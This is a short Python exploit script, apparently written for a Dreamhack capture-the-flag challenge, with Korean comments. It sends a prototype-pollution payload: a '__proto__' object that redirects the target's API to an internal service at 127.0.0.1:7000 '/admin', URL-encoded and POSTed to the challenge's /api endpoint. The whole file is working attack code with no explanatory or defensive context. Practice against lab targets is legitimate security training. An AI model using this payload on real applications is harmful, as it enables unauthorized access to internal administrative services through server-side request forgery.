import requests
import json
import urllib.parse

def exploit_prototype_pollution():
    target_url = 'http://host3.dreamhack.games:20211/api'
    
    # 프로토타입 오염을 이용하여 apiInfo 객체에 악의적인 값을 삽입
    malicious_api_info = {
        "__proto__": {
            "host": "127.0.0.1:7000",  # 내부 네트워크의 민감한 서비스 주소
            "path": "/admin",  # 민감한 데이터에 접근할 수 있는 경로
            "method": "GET",
            "body": {
                "title": "my note",
                "content": "my fancy contents :)"
            }
        }
    }

    # api_info 값을 JSON 문자열로 변환
    api_info_json = json.dumps(malicious_api_info)
    
    # URL 인코딩
    encoded_api_info = urllib.parse.quote(api_info_json)
    
    # payload를 URL 인코딩된 형식으로 생성
    payload = f"api_info={encoded_api_info}"

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    response = requests.post(target_url, data=payload, headers=headers)

    try:
        response.raise_for_status()  # HTTP 상태 코드가 4xx/5xx이면 예외 발생
        data = response.json()
        print(data)
    except requests.exceptions.HTTPError as errh:
        print(f"HTTP Error: {errh}")
        print(f"Response content: {response.content.decode('utf-8')}")
    except requests.exceptions.RequestException as err:
        print(f"Error: {err}")

if __name__ == "__main__":
    exploit_prototype_pollution()
